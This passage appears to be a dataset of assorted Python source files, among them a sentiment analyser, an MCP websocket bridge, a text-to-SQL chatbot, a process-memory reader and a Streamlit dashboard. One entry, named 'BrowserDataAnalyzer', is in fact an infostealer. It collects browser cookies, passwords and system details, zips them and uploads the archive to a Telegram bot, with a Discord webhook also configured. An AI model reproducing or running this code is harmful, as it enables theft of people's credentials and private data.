)\n        print(target_responses)\n        break\n\n",
    "import re\nfrom textblob import TextBlob\n\nclass CryptoSentiment:\n    def __init__(self, tweets):\n        self.tweets = tweets\n\n    @staticmethod\n    def clean_tweet(tweet):\n        \"\"\"\n        Utility function to clean the text in a tweet by removing links, special characters, etc.\n        \"\"\"\n        return re.sub(r\"http\\S+|@\\S+|#\\S+|[^a-zA-Z0-9\\s]\", \"\", tweet)\n\n    def analyze_sentiment(self):\n        \"\"\"\n        Perform sentiment analysis on the tweets.\n        Returns a dictionary with counts of positive, neutral, and negative sentiments.\n        \"\"\"\n        sentiment_counts = {\"positive\": 0, \"neutral\": 0, \"negative\": 0}\n        for tweet in self.tweets:\n            clean_text = self.clean_tweet(tweet)\n            analysis = TextBlob(clean_text)\n            # Classify sentiment\n            if analysis.sentiment.polarity > 0:\n                sentiment_counts[\"positive\"] += 1\n            elif analysis.sentiment.polarity == 0:\n                sentiment_counts[\"neutral\"] += 1\n            else:\n                sentiment_counts[\"negative\"] += 1\n        return sentiment_counts",
    "import argparse\nimport asyncio\nimport json\nimport logging\nimport os\nimport shlex\nimport sys\nimport time\n\nfrom asyncio import create_subprocess_exec, subprocess, Queue\nfrom pathlib import Path\nfrom typing import Optional, Dict, List, Any, Union, Tuple\n\nimport jsonschema\nimport websockets\n\nfrom colorama import Fore, Style, init as init_colorama\nfrom websockets.legacy.server import WebSocketServerProtocol\n\n# Initialize colorama for cross-platform color support\ninit_colorama()\n\n# CLI formatting constants\nSUCCESS_PREFIX = \"\u2705\"\nSTART_PREFIX = \"\ud83d\ude80\"\nSUMMARY_PREFIX = \"\u2728\"\nWEBSOCKET_PREFIX = \"\ud83d\udd17\"\nBULLET_POINT = \"\u2022\"\nSERVER_NAME_COLOR = Fore.CYAN\nCOMMAND_COLOR = Fore.WHITE\nRESET = Style.RESET_ALL\n\nDEFAULT_CONFIG = \"\"\"{\n  \"mcpServers\": {\n    \"wcgw\": {\n      \"command\": \"uvx\",\n      \"args\": [\n        \"--refresh\",\n        \"--from\",\n        \"wcgw@latest\",\n        \"--python\",\n        \"3.12\",\n        \"wcgw_mcp\"\n      ]\n    },\n    \"fetch\": {\n      \"command\": \"uvx\",\n      \"args\": [\n        \"--refresh\",\n        \"mcp-server-fetch\"\n      ]\n    }\n  }\n}\"\"\"\n\nlogging.basicConfig(level=logging.INFO)\n# Silence all websockets loggers at the root\nlogging.getLogger('websockets').setLevel(logging.WARNING)\nlogger = logging.getLogger(__name__)\nwebsockets_logger = logging.getLogger('websockets.server')\nwebsockets_logger.setLevel(logging.WARNING)  # Reduce websockets library logging\n\nclass MessagePublisher:\n    \"\"\"Handles publishing messages to WebSocket clients.\"\"\"\n    def __init__(self):\n        self.message_queue: \"Queue[Dict[str, Any]]\" = Queue()\n        self.websocket: Optional[WebSocketServerProtocol] = None\n        self.running = False\n        self._task: Optional[asyncio.Task] = None\n\n    def set_websocket(self, websocket: WebSocketServerProtocol):\n        \"\"\"Set the WebSocket connection to publish messages to.\"\"\"\n        self.websocket = websocket\n\n    async def start(self):\n        \"\"\"Start the message publishing task.\"\"\"\n        if self._task is None:\n            self.running = True\n            self._task = asyncio.create_task(self._publish_messages())\n\n    async def stop(self):\n        \"\"\"Stop the message publishing task.\"\"\"\n        self.running = False\n        if self._task:\n            await self.message_queue.put(None)  # Sentinel to stop the loop\n            await self._task\n            self._task = None\n\n    async def publish(self, message: Dict[str, Any]):\n        \"\"\"Queue a message for publishing.\"\"\"\n        await self.message_queue.put(message)\n\n    async def _publish_messages(self):\n        \"\"\"Main loop for publishing messages to WebSocket.\"\"\"\n        while self.running:\n            try:\n                message = await self.message_queue.get()\n                if message is None:  # Stop sentinel\n                    break\n\n                if self.websocket and self.websocket.state == websockets.protocol.State.OPEN:\n                    await self.websocket.send(json.dumps(message))\n\n            except Exception as e:\n                logger.error(f\"Error publishing message: {e}\")\n                continue\n\nINITIALIZE_REQUEST_SCHEMA = {\n    \"type\": \"object\",\n    \"required\": [\"jsonrpc\", \"method\", \"params\", \"id\"],\n    \"properties\": {\n        \"jsonrpc\": {\"type\": \"string\", \"enum\": [\"2.0\"]},\n        \"method\": {\"type\": \"string\", \"enum\": [\"initialize\"]},\n        \"params\": {\n            \"type\": \"object\",\n            \"required\": [\"protocolVersion\", \"clientInfo\", \"capabilities\"],\n            \"properties\": {\n                \"protocolVersion\": {\"type\": \"string\"},\n                \"clientInfo\": {\n                    \"type\": \"object\",\n                    \"required\": [\"name\", \"version\"],\n                    \"properties\": {\n                        \"name\": {\"type\": \"string\"},\n                        \"version\": {\"type\": \"string\"}\n                    }\n                },\n                \"capabilities\": {\"type\": \"object\"}\n            }\n        },\n        \"id\": {\"type\": [\"string\", \"number\"]}\n    }\n}\n\nclass McpServer:\n    \"\"\"Represents a single MCP server process and its state.\"\"\"\n    def __init__(self, name: str, command: str, env: Optional[Dict[str, str]] = None):\n        self.name = name\n        self.command = command\n        self.env = env or {}\n        self.process: Optional[subprocess.Process] = None\n        self.pending_requests: Dict[str, Tuple[asyncio.Future, bool]] = {}\n        self.tools: Dict[str, Any] = {}  # Map of tool names to their schemas\n        self.initialized = False\n        self.message_publisher: Optional[MessagePublisher] = None\n\n    async def start_process(self):\n        \"\"\"Start the MCP server process\"\"\"\n        args = shlex.split(self.command)\n        process_env = {**os.environ, **self.env}\n\n        self.process = await create_subprocess_exec(\n            *args,\n            stdin=subprocess.PIPE,\n            stdout=subprocess.PIPE,\n            stderr=subprocess.PIPE,\n            env=process_env\n        )\n\n        if not self.process.stdin or not self.process.stdout:\n            raise RuntimeError(f\"Failed to create process pip",
    "crc8_table = [\n    0, 94, 188, 226, 97, 63, 221, 131, 194, 156, 126, 32, 163, 253, 31, 65,\n    157, 195, 33, 127, 252, 162, 64, 30, 95, 1, 227, 189, 62, 96, 130, 220,\n    35, 125, 159, 193, 66, 28, 254, 160, 225, 191, 93, 3, 128, 222, 60, 98,\n    190, 224, 2, 92, 223, 129, 99, 61, 124, 34, 192, 158, 29, 67, 161, 255,\n    70, 24, 250, 164, 39, 121, 155, 197, 132, 218, 56, 102, 229, 187, 89, 7,\n    219, 133, 103, 57, 186, 228, 6, 88, 25, 71, 165, 251, 120, 38, 196, 154,\n    101, 59, 217, 135, 4, 90, 184, 230, 167, 249, 27, 69, 198, 152, 122, 36,\n    248, 166, 68, 26, 153, 199, 37, 123, 58, 100, 134, 216, 91, 5, 231, 185,\n    140, 210, 48, 110, 237, 179, 81, 15, 78, 16, 242, 172, 47, 113, 147, 205,\n    17, 79, 173, 243, 112, 46, 204, 146, 211, 141, 111, 49, 178, 236, 14, 80,\n    175, 241, 19, 77, 206, 144, 114, 44, 109, 51, 209, 143, 12, 82, 176, 238,\n    50, 108, 142, 208, 83, 13, 239, 177, 240, 174, 76, 18, 145, 207, 45, 115,\n    202, 148, 118, 40, 171, 245, 23, 73, 8, 86, 180, 234, 105, 55, 213, 139,\n    87, 9, 235, 181, 54, 104, 138, 212, 149, 203, 41, 119, 244, 170, 72, 22,\n    233, 183, 85, 11, 136, 214, 52, 106, 43, 117, 151, 201, 74, 20, 246, 168,\n    116, 42, 200, 150, 21, 75, 169, 247, 182, 232, 10, 84, 215, 137, 107, 53\n]\n\n\ndef checksum_crc8(data: bytes) -> int:\n    \"\"\"\n    Calculate the CRC-8 checksum for the given data.\n\n    :param data: Input data as bytes.\n    :return: CRC-8 checksum as an integer.\n    \"\"\"\n    check = 0\n    for d in data:\n        check = crc8_table[check ^ d]\n    return check",
    "import re\nimport json\nfrom typing import AsyncGenerator\nimport asyncio\nfrom sqlite3 import Error as SQLiteError\nfrom sqlalchemy.exc import SQLAlchemyError\nfrom langchain_core.messages import AIMessage\nfrom query_validator import is_flight_related_query\nfrom fastapi import HTTPException\nfrom response_prompt import response_prompt\nfrom generate_and_verify_sql import generate_sql\nfrom config import llm, db, logger\n\n\"\"\"\nfrom vector_db import process_documents, search_policy, documents\n\n# Run the async function\nprocessed_data = asyncio.run(process_documents(documents))\n\nquery_result = asyncio.run(\n    search_policy(\n        \"VietJet Air\", \n        \"which is the cheapest flight from New Delhi to Hanoi which allows most luggage?\")\n    )\n\"\"\"\n\nasync def stream_response(question: str) -> AsyncGenerator[str, None]:\n    try:\n        if not is_flight_related_query(question):\n            yield json.dumps({\n                \"type\": \"error\",\n                \"content\": \"Query not related to flight data. Please ask about flights, prices, routes, or travel dates.\"\n            })\n            return\n\n        # Generate and verify SQL query\n        cleaned_query = await generate_sql(question)\n\n        # Stream SQL query in chunks\n        sql_chunks = [cleaned_query[i:i+10] for i in range(0, len(cleaned_query), 10)]\n        for chunk in sql_chunks:\n            yield json.dumps({\n                \"type\": \"sql\",\n                \"content\": chunk\n            })\n            await asyncio.sleep(0.05)  # Add small delay between chunks\n\n        # Execute query\n        query_results = await execute_query(cleaned_query)\n\n        # Generate response using streaming\n        response_input = {\n            \"question\": question,\n            \"sql_query\": cleaned_query,\n            \"query_result\": query_results\n        }\n        formatted_response_prompt = response_prompt.format(**response_input)\n\n        buffer = \"\"\n        current_think = False\n\n        # Stream the response chunks\n        async for chunk in llm.astream(formatted_response_prompt):\n            if isinstance(chunk, AIMessage):\n                content = chunk.content\n            else:\n                content = str(chunk)\n\n            # Check for think tags\n            if '<think>' in content:\n                current_think = True\n                continue\n            elif '</think>' in content:\n                current_think = False\n                continue\n\n            # Skip content if we're inside think tags\n            if current_think:\n                continue\n\n            # Add the chunk to buffer\n            buffer += content\n\n            # Check if we have complete words or punctuation\n            if re.search(r'[.,!?\\s]$', buffer):\n                # Send the buffered content\n                if buffer.strip():\n                    yield json.dumps({\n                        \"type\": \"answer\",\n                        \"content\": buffer\n                    })\n                buffer = \"\"\n\n        # Send any remaining buffered content\n        if buffer.strip():\n            yield json.dumps({\n                \"type\": \"answer\",\n                \"content\": buffer\n            })\n\n    except Exception as e:\n        logger.error(\"Error in stream_response: %s\", str(e))\n        yield json.dumps({\n            \"type\": \"error\",\n            \"content\": str(e)\n        })\n\nasync def get_table_info():\n    \"\"\"Get database schema information\"\"\"\n    try:\n        return db.get_table_info()\n    except (SQLAlchemyError, SQLiteError) as e:\n        raise HTTPException(\n            status_code=500,\n            detail=f\"Error accessing database schema: {str(e)}\"\n        ) from e\n\nasync def execute_query(query: str):\n    \"\"\"Execute SQL query and return results\"\"\"\n    try:\n        return db.run(query)\n    except (SQLAlchemyError, SQLiteError) as e:\n        raise HTTPException(\n            status_code=500,\n            detail=f\"SQL execution error: {str(e)}\"\n        ) from e\n",
    "import pymem\nimport time\nimport platform\nfrom ctypes import windll\n\nclass MemoryMonitor:\n    def __init__(self):\n        # \u521d\u59cb\u5316 Windows API\n        self.user32 = windll.user32\n\n    def connect_tdx(self, stock_code):\n        \"\"\"\n        \u5411\u901a\u8fbe\u4fe1\u5e7f\u64ad\u80a1\u7968\u4ee3\u7801\n        \"\"\"\n        if stock_code.startswith('6'):  # \u4e0a\u6d77\u8bc1\u5238\u4ea4\u6613\u6240\n            TDX_code = '7' + str(stock_code)\n        else:  # \u6df1\u5733\u8bc1\u5238\u4ea4\u6613\u6240\n            TDX_code = '6' + str(stock_code)\n        \n        if platform.system() == 'Windows':\n            # \u6ce8\u518c\u81ea\u5b9a\u4e49\u6d88\u606f\n            UWM_STOCK = self.user32.RegisterWindowMessageW(\"stock\")\n            # \u53d1\u9001\u6d88\u606f\u5230\u901a\u8fbe\u4fe1\n            self.user32.PostMessageW(0xFFFF, UWM_STOCK, int(TDX_code), 0)\n            print(f\"\u5df2\u5e7f\u64ad\u80a1\u7968\u4ee3\u7801: {TDX_code}\")\n        else:\n            print(\"\u975e Windows \u7cfb\u7edf\uff0c\u65e0\u6cd5\u5e7f\u64ad\")\n\n    def monitor_memory(self, process_name, base_offset, pointer_offset, interval=1):\n        \"\"\"\n        \u76d1\u63a7\u5185\u5b58\u5730\u5740\u7684\u503c\u53d8\u5316\uff0c\u5e76\u5e7f\u64ad\u5230\u901a\u8fbe\u4fe1\n        \"\"\"\n        try:\n            # \u6253\u5f00\u8fdb\u7a0b\n            pm = pymem.Pymem(process_name)\n            \n            # \u83b7\u53d6\u6a21\u5757\u57fa\u5740\n            base_address = pymem.process.module_from_name(pm.process_handle, process_name).lpBaseOfDll\n            \n            # \u8ba1\u7b97\u6700\u7ec8\u5730\u5740\n            final_address = base_address + base_offset\n            \n            # \u521d\u59cb\u5316\u4e0a\u4e00\u6b21\u7684\u503c\n            last_value = None\n            \n            print(f\"\u5f00\u59cb\u76d1\u63a7\u5185\u5b58\u5730\u5740: {hex(final_address)}\")\n            while True:\n                # \u8bfb\u53d6\u6307\u9488\u5730\u5740\n                pointer_address = pm.read_uint(final_address)\n                \n                # \u8bfb\u53d6\u6307\u9488\u6307\u5411\u7684\u5b57\u7b26\u4e32\u6570\u636e\n                current_value = pm.read_string(pointer_address + pointer_offset, 7)\n                \n                # \u5982\u679c\u503c\u53d1\u751f\u53d8\u5316\n                if current_value != last_value:\n                    print(f\"\u503c\u53d1\u751f\u53d8\u5316: {last_value} -> {current_value}\")\n                    \n                    # \u53d6\u6700\u65b0\u5b57\u7b26\u4e32\u7684\u540e\u516d\u4f4d\n                    new_value = current_value[-6:] if len(current_value) >= 6 else current_value\n                    print(f\"\u540e\u516d\u4f4d\u5b57\u7b26\u4e32: {new_value}\")\n                    \n                    # \u5411\u901a\u8fbe\u4fe1\u5e7f\u64ad\n                    self.connect_tdx(new_value)\n                    \n                    # \u66f4\u65b0\u4e0a\u4e00\u6b21\u7684\u503c\n                    last_value = current_value\n                \n                # \u7b49\u5f85\u6307\u5b9a\u7684\u95f4\u9694\u65f6\u95f4\n                time.sleep(interval)\n        \n        except pymem.exception.ProcessNotFound:\n            print(f\"\u672a\u627e\u5230\u8fdb\u7a0b: {process_name}\")\n        except pymem.exception.MemoryReadError:\n            print(\"\u65e0\u6cd5\u8bfb\u53d6\u5185\u5b58\")\n        except KeyboardInterrupt:\n            print(\"\u76d1\u63a7\u5df2\u505c\u6b62\")\n        except Exception as e:\n            print(f\"\u53d1\u751f\u9519\u8bef: {e}\")\n\n# \u793a\u4f8b\uff1a\u5728\u5176\u4ed6\u6a21\u5757\u4e2d\u8c03\u7528\nif __name__ == \"__main__\":\n    # \u521b\u5efa MemoryMonitor \u5b9e\u4f8b\n    monitor = MemoryMonitor()\n    \n    # \u8bbe\u7f6e\u76d1\u63a7\u53c2\u6570\n    process_name = \"hexin.exe\"  # \u76ee\u6807\u8fdb\u7a0b\u540d\u79f0\n    base_offset = 0x017944D8    # \u57fa\u5740\u504f\u79fb\u91cf\n    pointer_offset = 0x0        # \u6307\u9488\u504f\u79fb\u91cf\uff08\u5982\u679c\u9700\u8981\uff09\n    interval = 1                # \u76d1\u63a7\u95f4\u9694\u65f6\u95f4\uff08\u79d2\uff09\n    \n    # \u5f00\u59cb\u76d1\u63a7\n    monitor.monitor_memory(process_name, base_offset, pointer_offset, interval)\n",
    "import streamlit as st\nimport pandas as pd\nimport plotly.express as px\nimport matplotlib.pyplot as plt \nimport seaborn as sns\n\nst.title(\"Customer Behavior Segmentation Dashboard\")\n# Load the dataset\n@st.cache_data\ndef load_data():\n    # Load your dataset here\n    data = pd.read_csv(\"data/merged_segment_data.csv\")\n    return data\n\ndata = load_data()\n\n\n# Sidebar Filters\nst.sidebar.header(\"Filter Options\")\nwebsitebehavior_segments = st.sidebar.multiselect(\"Select Segments to Filter\", options=data[\"WebsiteBehaviorSegment\"].unique(), default=data[\"WebsiteBehaviorSegment\"].unique())\npurchase_segments = st.sidebar.multiselect(\"Select Purchase Segments\", options=data[\"PurchasingSegment\"].unique(), default=data[\"PurchasingSegment\"].unique())\n\nfiltered_data = data[(data[\"WebsiteBehaviorSegment\"].isin(websitebehavior_segments)) & (data[\"PurchasingSegment\"].isin(purchase_segments))]\n\n\n\n# Tailored Visualizations\n\n# 1. Bubble Chart: Purchase Amount vs Website Visits vs Time on Site\nst.subheader(\"Purchase Behavior vs Website Engagement\")\nbubble_chart = px.scatter(\n    filtered_data, \n    x=\"WebsiteVisits\", \n    y=\"PurchaseAmount\", \n    size=\"TimeOnSite\", \n    color=\"WebsiteBehaviorSegment\",\n    hover_name=\"CustomerID\",\n    title=\"Bubble Chart: Purchase Amount vs Website Visits\",\n    labels={\"WebsiteVisits\": \"Website Visits\", \"PurchaseAmount\": \"Purchase Amount\"}\n)\nst.plotly_chart(bubble_chart)\n\n# 2. Scatter Plot: Time on Site vs Purchases\nst.subheader(\"Engagement Duration and Conversion\")\nscatter_plot = px.scatter(\n    filtered_data,\n    x=\"TimeOnSite\",\n    y=\"PurchaseAmount\",\n    color=\"PurchasingSegment\",\n    size=\"WebsiteVisits\",\n    hover_name=\"CustomerID\",\n    title=\"Scatter Plot: Time on Site vs Purchases\",\n    labels={\"TimeOnSite\": \"Time on Site\", \"PurchaseAmount\": \"Purchase Amount\"}\n)\nst.plotly_chart(scatter_plot)\n\n# 3. Pie Chart: Segment Composition\nst.subheader(\"Website Segment Distribution\")\npie_chart = px.pie(\n    filtered_data, \n    names=\"WebsiteBehaviorSegment\", \n    values=\"CustomerID\",\n    title=\"Website Segment Distribution\",\n    labels={\"WebsiteBehaviorSegment\": \"Segment\"}\n)\nst.plotly_chart(pie_chart)\n\n#time on site distribution\nst.subheader(\"Distribution of Time on Site\")\nhist_chart = px.histogram(\n    filtered_data,\n    x=\"TimeOnSite\",\n    color=\"WebsiteBehaviorSegment\",\n    nbins=20,\n    title=\"Histogram: Time on Site Distribution\",\n    labels={\"TimeOnSite\": \"Time on Site (minutes)\"}\n)\nst.plotly_chart(hist_chart)\n\n#correlation heatmap\nst.subheader(\"Feature Correlation Heatmap\")\ncorrelation_data = filtered_data[[\"WebsiteVisits\", \"TimeOnSite\", \"PurchaseAmount\"]]\ncorr_matrix = correlation_data.corr()\n\nfig, ax = plt.subplots()\nsns.heatmap(corr_matrix, annot=True, cmap=\"coolwarm\", ax=ax)\nst.pyplot(fig)\n\n#bar chart; purchase amount by segments\nst.subheader(\"Purchase Amount by Segment\")\nbar_chart = px.bar(\n    filtered_data,\n    x=\"PurchasingSegment\",\n    y=\"PurchaseAmount\",\n    color=\"WebsiteBehaviorSegment\",\n    title=\"Purchase Amount by Segment\",\n    labels={\"PurchasingSegment\": \"Purchase Segment\", \"PurchaseAmount\": \"Purchase Amount\"}\n)\nst.plotly_chart(bar_chart)\n\n#sunburst chart ; combined segmentation\nst.subheader(\"Combined Segmentation: Website + Purchase\")\nsunburst_chart = px.sunburst(\n    filtered_data,\n    path=[\"WebsiteBehaviorSegment\", \"PurchasingSegment\"],\n    values=\"CustomerID\",\n    title=\"Combined Segmentation\",\n    labels={\"CustomerID\": \"Number of Customers\"}\n)\nst.plotly_chart(sunburst_chart)\n\n#stacked_bar; segment contribution to revenue\nst.subheader(\"Segment Contribution to Revenue\")\nstacked_bar = px.bar(\n    filtered_data,\n    x=\"WebsiteBehaviorSegment\",\n    y=\"PurchaseAmount\",\n    color=\"PurchasingSegment\",\n    title=\"Segment Contribution to Revenue\",\n    labels={\"WebsiteBehaviorSegment\": \"Website Segment\", \"PurchaseAmount\": \"Total Revenue\"}\n)\nst.plotly_chart(stacked_bar)\n\n#box_plot; purchase amount by segment\nst.subheader(\"Purchase Amount Distribution by Segment\")\nbox_chart = px.box(\n    filtered_data,\n    x=\"PurchasingSegment\",\n    y=\"PurchaseAmount\",\n    color=\"WebsiteBehaviorSegment\",\n    title=\"Box Plot: Purchase Amount by Segment\",\n    labels={\"PurchasingSegment\": \"Segment\", \"PurchaseAmount\": \"Purchase Amount\"}\n)\nst.plotly_chart(box_chart)\n\n\n\n\n\n\n\n\n# Insights Table\nst.subheader(\"Domain-Specific Insights\")\ninsights = [\n    {\"Pattern\": \"High Website Visits & High Purchase Amount\", \"Insight\": \"These are loyal customers; offer loyalty rewards.\"},\n    {\"Pattern\": \"High Website Visits & Low Purchase Amount\", \"Insight\": \"Optimize product descriptions; consider retargeting ads.\"},\n    {\"Pattern\": \"Low Website Visits & High Purchase Amount\", \"Insight\": \"Efficient shoppers; introduce a streamlined 'Quick Buy' feature.\"},\n    {\"Pattern\": \"Low Website Visits & Low Purchase Amount\", \"Insight\": \"Increase awareness through social media campaigns.\"},\n]\ninsights_df = pd.DataFrame(insights)\nst.table(insights_df)\n\n\n\n# Save Filtered Data\nif st.sidebar.button(\"Download Filtered Data\"):\n    filtered_data.",
    "# Copyright (c) Facebook, Inc. and its affiliates.\n# All rights reserved.\n#\n# This source code is licensed under the license found in the\n# LICENSE file in the root directory of this source tree.\n\nimport contextlib\nimport json\nimport logging\nimport numbers\nimport os\nfrom argparse import Namespace\nfrom pathlib import Path\nfrom typing import Dict, Generator, Optional\nimport pdb\nimport pandas\nimport yaml\nfrom simuleval.data.dataloader import GenericDataloader, build_dataloader\nfrom simuleval.data.dataloader.dataloader import IterableDataloader\nfrom tqdm import tqdm\n\nfrom .instance import INSTANCE_TYPE_DICT, LogInstance\nfrom .scorers import get_scorer_class\nfrom .scorers.latency_scorer import LatencyScorer\nfrom .scorers.quality_scorer import QualityScorer\n\ntry:\n    import sentencepiece\n\n    IS_IMPORT_SPM = True\nexcept Exception:\n    IS_IMPORT_SPM = False\n\n\nlogger = logging.getLogger(\"simuleval.sentence_level_evaluator\")\n\n\nclass SentenceLevelEvaluator(object):\n    \"\"\"\n    Sentence Level evaluator. It iterates over sentence pairs and run evaluation.\n\n\n    .. code-block:: python\n\n        for instance in self.maybe_tqdm(self.instances.values()):\n            agent.reset()\n            while not instance.finish_prediction:\n                input_segment = instance.send_source(self.source_segment_size)\n                output_segment = agent.pushpop(input_segment)\n                instance.receive_prediction(output_segment)\n\n\n    Attributes:\n        instances: collections of sentence pairs. Instances also keep track of delays.\n        latency_scorers (List[~simuleval.scorers.latency_scorer.LatencyScorer]): Scorers for latency evaluation.\n        quality_scorers (List[~simuleval.scorers.latency_scorer.QualityScorer]): Scorers for quality evaluation.\n        output: output directory\n\n    Evaluator related command line arguments:\n\n    .. argparse::\n        :ref: simuleval.options.add_evaluator_args\n        :passparser:\n        :prog:\n    \"\"\"\n\n    def __init__(\n        self,\n        dataloader: Optional[GenericDataloader],\n        quality_scorers: Dict[str, QualityScorer],\n        latency_scorers: Dict[str, LatencyScorer],\n        args: Namespace,\n    ) -> None:\n        self.dataloader = dataloader\n        self.quality_scorers = quality_scorers\n        self.latency_scorers = latency_scorers\n        self.instances = {}\n\n        self.args = args\n        self.output = Path(args.output) if args.output else None\n        self.score_only = args.score_only\n        self.no_scoring = args.no_scoring\n        self.source_segment_size = getattr(args, \"source_segment_size\", 1)\n        self.source_type = getattr(args, \"source_type\", None)\n        self.target_type = getattr(args, \"target_type\", None)\n\n        self.target_spm_model = None\n        if args.eval_latency_unit == \"spm\":\n            assert args.eval_latency_spm_model\n            assert IS_IMPORT_SPM\n            self.target_spm_model = sentencepiece.SentencePieceProcessor(\n                model_file=args.eval_latency_spm_model\n            )\n\n        if (\n            self.source_type is None\n            and self.target_type is None\n            and self.output is not None\n        ):\n            with open(self.output / \"config.yaml\") as f:\n                configs = yaml.safe_load(f)\n                self.source_type = configs[\"source_type\"]\n                self.target_type = configs[\"target_type\"]\n\n        assert self.source_type\n        assert self.target_type\n\n        if self.output is not None:\n            os.makedirs(self.output, exist_ok=True)\n            with open(self.output / \"config.yaml\", \"w\") as f:\n                yaml.dump(\n                    {\"source_type\": self.source_type, \"target_type\": self.source_type},\n                    f,\n                    default_flow_style=False,\n                )\n\n        self.instance_class = INSTANCE_TYPE_DICT[\n            f\"{self.source_type}-{self.target_type}\"\n        ]\n        self.start_index = getattr(args, \"start_index\", 0)\n        self.end_index = getattr(args, \"end_index\", -1)\n\n        if not self.score_only:\n            if self.output:\n                if (\n                    self.args.continue_unfinished\n                    and (self.output / \"instances.log\").exists()\n                ):\n                    with open(self.output / \"instances.log\", \"r\") as f:\n                        line = None\n                        for line in f:  # noqa\n                            pass\n                        if line is not None:\n                            last_info = json.loads(line.strip())\n                            self.start_index = last_info[\"index\"] + 1\n                else:\n                    self.output.mkdir(exist_ok=True, parents=True)\n                    open(self.output / \"instances.log\", \"w\").close()\n            if self.end_index < 0:\n                assert self.dataloader is not None\n                self.end_index = len(self.dataloader)\n\n        self.build_instances()\n\n        iterable = self.instances.values()\n        if isin",
    "#!/usr/bin/env python3\n\nimport os\nimport json\nimport sqlite3\nimport platform\nimport datetime\nimport hashlib\nfrom pathlib import Path\nfrom base64 import b64encode, b64decode\nimport logging\nimport uuid\nfrom urllib.parse import urlparse\nimport subprocess\nimport shutil\nimport tempfile\nimport glob\nimport browser_cookie3\nimport secretstorage\nimport json\nfrom Crypto.Cipher import AES\nimport configparser\nfrom getpass import getpass\nimport requests\nimport zipfile\nfrom datetime import datetime\nimport time\n\nDISCORD_WEBHOOK_URL = \"YOUR_DISCORD_WEBHOOK_URL\"\nTELEGRAM_BOT_TOKEN = \"YOUR_TELEGRAM_BOT_TOKEN\"\nTELEGRAM_CHAT_ID = \"YOUR_TELEGRAM_CHAT_ID\"\nAVATAR_URL = \"YOUR_AVATAR_URL\"\n\nclass BrowserDataAnalyzer:\n    def __init__(self):\n        self.setup_logging()\n        self.system = platform.system()\n        self.session_id = str(uuid.uuid4())[:8]\n        self.output_dir = self.create_output_directories()\n        \n    def setup_logging(self):\n        logging.basicConfig(\n            level=logging.INFO,\n            format='%(asctime)s - %(levelname)s - %(message)s'\n        )\n        self.logger = logging.getLogger(__name__)\n\n    def create_output_directories(self):\n        timestamp = datetime.now().strftime(\"%Y%m%d_%H%M%S\")\n        base_dir = f'browser_data_{timestamp}_{self.session_id}'\n        os.makedirs(base_dir, exist_ok=True)\n        os.makedirs(os.path.join(base_dir, 'cookies'), exist_ok=True)\n        os.makedirs(os.path.join(base_dir, 'passwords'), exist_ok=True)\n        return base_dir\n\n    def zip_results(self):\n        zip_path = f\"{self.output_dir}.zip\"\n        with zipfile.ZipFile(zip_path, 'w', zipfile.ZIP_DEFLATED) as zipf:\n            for root, _, files in os.walk(self.output_dir):\n                for file in files:\n                    file_path = os.path.join(root, file)\n                    arcname = os.path.relpath(file_path, self.output_dir)\n                    zipf.write(file_path, arcname)\n        return zip_path\n\n    def get_system_info(self):\n        try:\n            if platform.system() == \"Linux\":\n                cpu_info = \"Unknown\"\n                try:\n                    with open('/proc/cpuinfo', 'r') as f:\n                        for line in f:\n                            if 'model name' in line:\n                                cpu_info = line.split(':')[1].strip()\n                                break\n                except:\n                    pass\n            else:\n                cpu_info = platform.processor()\n\n            memory_info = \"Unknown\"\n            if platform.system() == \"Linux\":\n                try:\n                    with open('/proc/meminfo', 'r') as f:\n                        total = 0\n                        for line in f:\n                            if 'MemTotal' in line:\n                                total = int(line.split()[1]) // 1024\n                                memory_info = f\"{total // 1024:.1f} GB\"\n                                break\n                except:\n                    pass\n\n            disk_info = \"Unknown\"\n            try:\n                total, used, free = shutil.disk_usage('/')\n                disk_info = f\"Total: {total // (2**30):.1f} GB, Used: {used // (2**30):.1f} GB, Free: {free // (2**30):.1f} GB\"\n            except:\n                pass\n\n            return {\n                \"OS\": f\"{platform.system()} {platform.release()}\",\n                \"Architecture\": platform.machine(),\n                \"Processor\": cpu_info,\n                \"Memory\": memory_info,\n                \"Disk\": disk_info,\n                \"Hostname\": platform.node(),\n                \"Username\": os.getlogin(),\n                \"Python Version\": platform.python_version(),\n                \"System Time\": datetime.now().strftime(\"%Y-%m-%d %H:%M:%S\")\n            }\n        except Exception as e:\n            self.logger.error(f\"Error getting system info: {str(e)}\")\n            return {}\n\n    def check_discord_api(self):\n        try:\n            response = requests.get(DISCORD_WEBHOOK_URL)\n            return response.status_code == 200\n        except:\n            return False\n\n    def check_telegram_api(self):\n        try:\n            url = f\"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/getMe\"\n            response = requests.get(url)\n            return response.status_code == 200\n        except:\n            return False\n\n    def upload_to_telegram(self, file_path):\n        try:\n            url = f\"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/sendDocument\"\n            with open(file_path, 'rb') as f:\n                files = {\n                    'document': f\n                }\n                data = {\n                    'chat_id': TELEGRAM_CHAT_ID,\n                    'caption': \"\ud83d\udd12 Data Collection Complete!\"\n                }\n                response = requests.post(url, files=files, data=data)\n                \n                if response.status_code == 200:\n                    self.logger.info(\"Successfully sent file through Telegram\")\n                    return True\n           ",
    "import multiprocessing\nimport os\nimport secrets\nimport signal\nimport sys\nimport threading\nimport time\nimport traceback\nfrom concurrent.futures import ThreadPoolExecutor\nfrom dataclasses import dataclass\nfrom datetime import datetime, timedelta\nfrom enum import Enum\nfrom multiprocessing import Lock, Process, Queue, Value\nfrom pathlib import Path\nfrom typing import Any, Dict, List, Optional, Tuple\nfrom uuid import UUID, uuid4\n\nimport httpx\nimport psutil\nimport uvicorn\nfrom dotenv import load_dotenv\nfrom fastapi import (\n    BackgroundTasks,\n    Depends,\n    FastAPI,\n    Header,\n    HTTPException,\n    Query,\n    Request,\n    status,\n)\nfrom fastapi.middleware.cors import CORSMiddleware\nfrom loguru import logger\nfrom pydantic import BaseModel, Field\n\nfrom swarms.structs.agent import Agent\n\n# Load environment variables\nload_dotenv()\n\n\n# # Set start method to 'fork' at the very beginning of the script\n# multiprocessing.set_start_method('fork')\n\n\n@dataclass\nclass ProcessMetrics:\n    \"\"\"Metrics for each API process.\"\"\"\n\n    pid: int\n    cpu_usage: float\n    memory_usage: float\n    request_count: int\n    last_heartbeat: float\n    port: int\n\n\nclass ProcessManager:\n    \"\"\"Manages multiple API processes and their metrics.\"\"\"\n\n    def __init__(self, num_processes: int = None, start_port: int = 8000):\n        self.num_processes = num_processes or multiprocessing.cpu_count()\n        self.start_port = start_port\n        self.processes: Dict[int, Process] = {}\n        self.metrics: 